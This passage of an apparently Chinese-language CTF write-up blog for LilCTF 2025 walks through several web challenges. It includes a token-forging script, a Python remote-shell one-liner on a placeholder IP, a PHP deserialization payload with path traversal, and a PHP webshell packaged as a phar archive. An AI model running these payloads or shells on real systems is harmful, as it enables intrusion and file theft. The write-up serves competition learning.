+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/server_info&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_info</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;server_start_time&#x27;</span>: SERVER_START_TIME,</span><br><span class="line">        <span class="string">&#x27;current_time&#x27;</span>: time.time()</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">input_string</span>):</span><br><span class="line">    byte_string = input_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte_string) &gt; <span class="number">6</span>: byte_string = byte_string[:<span class="number">6</span>]</span><br><span class="line">    padded_byte_string = byte_string.ljust(<span class="number">6</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    padded_int = <span class="built_in">int</span>.from_bytes(padded_byte_string, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> padded_int</span><br></pre></td></tr></table></figure></div>
+
+<p>在该题中，我们利用 &#x2F;server_info  获取server_start_time</p>
+<p>直接生成admin的token</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/forgot_password&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forgot_password</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        email = request.form.get(<span class="string">&#x27;email&#x27;</span>)</span><br><span class="line">        user = User.query.filter_by(email=email).first()</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            <span class="comment"># 选哪个UUID版本好呢，好头疼 &gt;_&lt;</span></span><br><span class="line">            <span class="comment"># UUID v8吧，看起来版本比较新</span></span><br><span class="line">            token = <span class="built_in">str</span>(uuid.uuid8(a=padding(user.username))) <span class="comment"># 可以自定义参数吗原来，那把username放进去吧</span></span><br><span class="line">            reset_token = PasswordResetToken(user_id=user.<span class="built_in">id</span>, token=token)</span><br><span class="line">            db.session.add(reset_token)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            <span class="comment"># TODO：写一个SMTP服务把token发出去</span></span><br><span class="line">            flash(<span class="string">f&#x27;密码恢复token已经发送，请检查你的邮箱&#x27;</span>, <span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;reset_password&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&#x27;没有找到该邮箱对应的注册账户&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;forgot_password&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;forgot_password.html&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>在忘记密码里操作一下</p>
+<p>这样就可以直接利用admin账号啦</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;current_time&quot;</span>:<span class="number">1756135944.4560633</span>,<span class="string">&quot;server_start_time&quot;</span>:<span class="number">1756135501.2837107</span>&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">再以server_start_time为seed去拿到admin的token</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">random.seed(<span class="number">1756135501.2837107</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">input_string</span>):</span><br><span class="line">    byte_string = input_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte_string) &gt; <span class="number">6</span>: byte_string = byte_string[:<span class="number">6</span>]</span><br><span class="line">    padded_byte_string = byte_string.ljust(<span class="number">6</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    padded_int = <span class="built_in">int</span>.from_bytes(padded_byte_string, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> padded_int</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(uuid.uuid8(a=padding(<span class="string">&#x27;admin&#x27;</span>)))</span><br><span class="line"><span class="comment">#最新的python3.14才支持的uuid6-8，注意安装一下环境</span></span><br></pre></td></tr></table></figure></div>
+
+<p>去&#x2F;forgot_password填进去uuid和要更改的密码即可</p>
+<p>另外一个方法就是把源码里的secret拿去伪造session，注意，改成admin没用，需要把id改为1,就拿到初始的admin账户了（）</p>
+<h4 id="二、拿到shell"><a href="#二、拿到shell" class="headerlink" title="二、拿到shell"></a>二、拿到shell</h4><p>这一步省略了()</p>
+<p>懒的去开vps…</p>
+<h4 id="三、反弹shell"><a href="#三、反弹shell" class="headerlink" title="三、反弹shell"></a>三、反弹shell</h4><p><a target="_blank" rel="noopener" href="https://www.revshells.com/">Online - Reverse Shell Generator</a></p>
+<p>可以了解下这个网站()</p>
+<p>注意 注意&#x2F;bin&#x2F;bash是不存在的  ，且无curl之类的工具</p>
+<p>直接执行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;exec(&quot;&quot;&quot;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&quot;x.x.x.x&quot;,9001));s1.listen(1);c,a=s1.accept();</span></span><br><span class="line"><span class="string">while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())&quot;&quot;&quot;)&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>即可弹到shell</p>
+<p>其余方法就不啰嗦了</p>
+<h3 id="Your-Uns3r"><a href="#Your-Uns3r" class="headerlink" title="Your Uns3r"></a><strong>Your Uns3r</strong></h3><p>心路历程：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">很典型的php反序列化题目，几个简单的WAF点我都知道，所以本地就很快通了</span><br><span class="line">出题人挺好心（）</span><br><span class="line">因此直接include <span class="string">&quot;lilctf../../../../flag&quot;</span>出了哎</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $username=&quot;admin&quot;;</span><br><span class="line">    public $value;</span><br><span class="line">    public function exec()</span><br><span class="line">    &#123;</span><br><span class="line">        $ser = unserialize(serialize(unserialize($this-&gt;value)));</span><br><span class="line">        if ($ser != $this-&gt;value &amp;&amp; $ser instanceof Access) &#123;</span><br><span class="line">            include($ser-&gt;getToken());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Access</span><br><span class="line">&#123;</span><br><span class="line">    protected $prefix=&#x27;&#x27;;</span><br><span class="line">    protected $suffix=&quot;../../../../../../../flag&quot;;</span><br><span class="line"></span><br><span class="line">    public function getToken()</span><br><span class="line">    &#123;</span><br><span class="line">        if (!is_string($this-&gt;prefix) || !is_string($this-&gt;suffix)) &#123;</span><br><span class="line">            throw new Exception(&quot;Go to HELL!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $result = $this-&gt;prefix . &#x27;lilctf&#x27; . $this-&gt;suffix;</span><br><span class="line">        if (strpos($result, &#x27;pearcmd&#x27;) !== false) &#123;</span><br><span class="line">            throw new Exception(&quot;Can I have peachcmd?&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return $result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user=new User();</span><br><span class="line">$user-&gt;value=serialize(new Access());</span><br><span class="line">echo urlencode(serialize($user));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>注意s—&gt;S 改admin-&gt;\61dmin（随便十六进制绕过）</p>
+<p>注意改Access-&gt;AccEss(随便大小写绕过)</p>
+<p>删除最后一个大括号</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这里稍微注意一下，遇到了throw new Exception(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">会使php直接退出，__destruct也不会执行，需要在这之前触发__destruct</span><br><span class="line">有两个方法</span><br><span class="line">一是直接删除末尾的一个大括号即可</span><br><span class="line">二是$payload=serialize(array($u,null));</span><br><span class="line">$payload = str_replace(<span class="string">&#x27;i:1&#x27;</span>, <span class="string">&#x27;i:0&#x27;</span>, $payload);</span><br></pre></td></tr></table></figure></div>
+
+<p>传user，成功include到flag文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3BS%3A5%3A%22\61dmin%22%3Bs%3A5%3A%22value%22%3Bs%3A89%3A%22O%3A6%3A%22AccEss%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A0%3A%22%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A25%3A%22..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag%22%3B%7D%22%3B</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="我曾有一份工作"><a href="#我曾有一份工作" class="headerlink" title="我曾有一份工作"></a>我曾有一份工作</h3><p>心路历程：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">扫描器没扫到www.<span class="built_in">zip</span></span><br><span class="line">全剧终</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="php-jail-is-my-cry"><a href="#php-jail-is-my-cry" class="headerlink" title="php_jail_is_my_cry"></a>php_jail_is_my_cry</h3><p>伪源码:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    $file_name = basename($url);</span><br><span class="line">    </span><br><span class="line">    $ch = curl_init($url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">    $data = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($data) &#123;</span><br><span class="line">        file_put_contents(<span class="string">&#x27;/tmp/&#x27;</span>.$file_name, $data);</span><br><span class="line">        echo <span class="string">&quot;文件已下载: &lt;a href=&#x27;?down=$file_name&#x27;&gt;$file_name&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;下载失败。&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset($_GET[<span class="string">&#x27;down&#x27;</span>]))&#123;</span><br><span class="line">    include <span class="string">&#x27;/tmp/&#x27;</span> . basename($_GET[<span class="string">&#x27;down&#x27;</span>]);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 上传文件</span><br><span class="line"><span class="keyword">if</span> (isset($_FILES[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    $target_dir = <span class="string">&quot;/tmp/&quot;</span>;</span><br><span class="line">    $target_file = $target_dir . basename($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    $orig = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    $ch = curl_init(<span class="string">&#x27;file://&#x27;</span>. $orig);</span><br><span class="line">    </span><br><span class="line">    // I hide a trick to bypass open_basedir, I<span class="string">&#x27;m sure you can find it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span></span><br><span class="line"><span class="string">    $data = curl_exec($ch);</span></span><br><span class="line"><span class="string">    curl_close($ch);</span></span><br><span class="line"><span class="string">    if (stripos($data, &#x27;</span>&lt;?<span class="string">&#x27;) === false &amp;&amp; stripos($data, &#x27;</span>php<span class="string">&#x27;) === false &amp;&amp; stripos($data, &#x27;</span>halt<span class="string">&#x27;) === false) &#123;</span></span><br><span class="line"><span class="string">        file_put_contents($target_file, $data);</span></span><br><span class="line"><span class="string">    &#125; else &#123;</span></span><br><span class="line"><span class="string">        echo &quot;存在 `&lt;?` 或者 `php` 或者 `halt` 恶意字符!&quot;;</span></span><br><span class="line"><span class="string">        $data = null;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>心路历程：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">拿到伪源码后关注了两处</span><br><span class="line">一个是include</span><br><span class="line">另一个是严密的内容过滤</span><br><span class="line">很不巧在不久前我刚好看了这篇关于php8的include与phar的邂逅</span><br><span class="line">因此也是第一时间尝试RCE</span><br><span class="line">一直用的是system传马，但是没看配置关了极大多数函数包括system</span><br><span class="line">因此卡了很久，最后意识到了()</span><br><span class="line">下一步是读懂，代码中真正缺少或者错误的地方是什么，跟随出题人的提示</span><br><span class="line">我搭了本地环境</span><br><span class="line">很明显，本地开的环境有一个很明显的问题，根本没有成功上传文件</span><br><span class="line">是的，利用好搜索引擎之后</span><br><span class="line">也是成功实现准任意文件读取了</span><br><span class="line">最后彻彻底底卡住了</span><br><span class="line">一头冲进gopher里面,一发不可收拾</span><br></pre></td></tr></table></figure></div>
+
+<p>关于php8与phar，大家可以看<a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/">https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/</a></p>
+<p>简单一句话就是，当include到带.phar的文件，甚至路径带也行，它会有一步解压操作，而我们可以在phar文件写入php代码,再gzip压缩，绕过对&lt;?的WAF，实现文件上传后的文件包含</p>
+<p>完成了这一步之后我们只是尝试了file_put_contents函数成功，其他基本全军覆没，赛后听eval可以，我忘了试()</p>
+<p>用eval写马就不用反复phar gzip 上传 包含的操作了()为什么会有这么蠢的人</p>
+<p>当然，我们回顾源码，发现利用了curl</p>
+<p>但是实际源码里的</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ch = curl_init(<span class="string">&#x27;file://&#x27;</span>. $orig);</span><br><span class="line">    </span><br><span class="line">    // I hide a trick to bypass open_basedir, I<span class="string">&#x27;m sure you can find it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span></span><br><span class="line"><span class="string">    $data = curl_exec($ch);</span></span><br></pre></td></tr></table></figure></div>
+
+<p>根本拿不到内容,因为，还有open_basedir的限制</p>
+<p>拷打chatgpt才知道，咱可以用</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ch = curl_init(<span class="string">&quot;file:///etc/passwd&quot;</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_PROTOCOLS_STR, <span class="string">&quot;all&quot;</span>);//这个默认把结果放到响应，如果要执行其他命令，可下面那样</span><br><span class="line">$data = curl_exec($ch);</span><br></pre></td></tr></table></figure></div>
+
+<p>拿到内容</p>
+<p>事实上我赛后试了下，你可以执行php代码之后直接拿Index.php看就行，也不至于去拷打ai()</p>
+<p>走到这一步，算是实现文件读取，但是读不了&#x2F;flag,无法执行&#x2F;readflag</p>
+<p>还是要拿到shell</p>
+<p>跳过我对gopher的求索之路，直接走到复现cnext上吧</p>
+<p> 打cnext漏洞了，php 8.3.0可以打  </p>
+<p> &#x2F;etc&#x2F;passwd和&#x2F;proc&#x2F;self&#x2F;maps可以读  ，那么就可以尝试了</p>
+<p>注意出题人给的hint， allow_url_include没有开启  ，无法使用data:&#x2F;&#x2F;,不会有人觉得单单是在提示这个吧，那应该就是我了()</p>
+<p>这样的话就得该打cnext的脚本，无法data:&#x2F;&#x2F;可以读文件触发</p>
+<p>复现了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">就要将resource=指向/tmp目录下的文件</span><br><span class="line">同时file_put_content没有被禁用，可以写文件到/tmp再用php://<span class="built_in">filter</span>通过filterchain读文件打cnext</span><br><span class="line">统一写文件到/tmp/io，再读取，来实现对resource的内容控制</span><br><span class="line">url传入 http://*****/?down=payload.phar.gz</span><br></pre></td></tr></table></figure></div>
+
+<p>payload.phar.gz</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&quot;include&quot;</span>])) &#123;</span><br><span class="line">    include $_POST[<span class="string">&quot;include&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&quot;download&quot;</span>])) &#123;</span><br><span class="line">    $ch = curl_init(<span class="string">&quot;file://&quot;</span>. $_POST[<span class="string">&quot;download&quot;</span>]);</span><br><span class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS_STR, <span class="string">&quot;all&quot;</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">    $data = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    echo $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&quot;content&quot;</span>]) &amp;&amp; isset($_POST[<span class="string">&quot;path&quot;</span>])) &#123;</span><br><span class="line">    $content = $_POST[<span class="string">&quot;content&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">&quot;base64&quot;</span>]) &#123;</span><br><span class="line">    	$content = base64_decode($content);</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($_POST[<span class="string">&quot;path&quot;</span>], $_POST[<span class="string">&quot;content&quot;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>生成payload一直失败，选择改cnect_exploit了</p>
+<p>成功~</p>
+<pre><code> `LILCTF&#123;daf47388-c311-4958-9894-fc239a480a31&#125;`
+</code></pre>
+<p><em>出题人还给了另一种最curl的思路，之后可以看看</em>:<a target="_blank" rel="noopener" href="https://blog.kengwang.com.cn/archives/668/">https://blog.kengwang.com.cn/archives/668/</a></p>
+<h3 id="blade-cc"><a href="#blade-cc" class="headerlink" title="blade_cc"></a>blade_cc</h3><p>心路历程:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">初学java，拼尽全力，无法战胜</span><br></pre></td></tr></table></figure></div>
+
+<p><code>[https://www.n1ght.cn/2025/08/21/blade_cc/](https://www.n1ght.cn/2025/08/21/blade_cc/)</code></p>
+<p>复现一下</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-bottle"><span class="toc-number">1.</span> <span class="toc-text">ez_bottle</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%BA%8C%EF%BC%9A%E6%96%9C%E4%BD%93%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.</span> <span class="toc-text">思路二：斜体字绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%89%EF%BC%9Asubprocess"><span class="toc-number">1.0.2.</span> <span class="toc-text">思路三：subprocess</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ekko-note"><span class="toc-number">2.</span> <span class="toc-text">Ekko_note</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%99%BB%E5%BD%95admin"><span class="toc-number">2.1.</span> <span class="toc-text">一、登录admin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%8B%BF%E5%88%B0shell"><span class="toc-number">2.2.</span> <span class="toc-text">二、拿到shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.3.</span> <span class="toc-text">三、反弹shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Your-Uns3r"><span class="toc-number">3.</span> <span class="toc-text">Your Uns3r</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E6%9B%BE%E6%9C%89%E4%B8%80%E4%BB%BD%E5%B7%A5%E4%BD%9C"><span class="toc-number">4.</span> <span class="toc-text">我曾有一份工作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-jail-is-my-cry"><span class="toc-number">5.</span> <span class="toc-text">php_jail_is_my_cry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#blade-cc"><span class="toc-number">6.</span> <span class="toc-text">blade_cc</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/Lilctf2025-WP/&text=Lilctf2025-WP"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
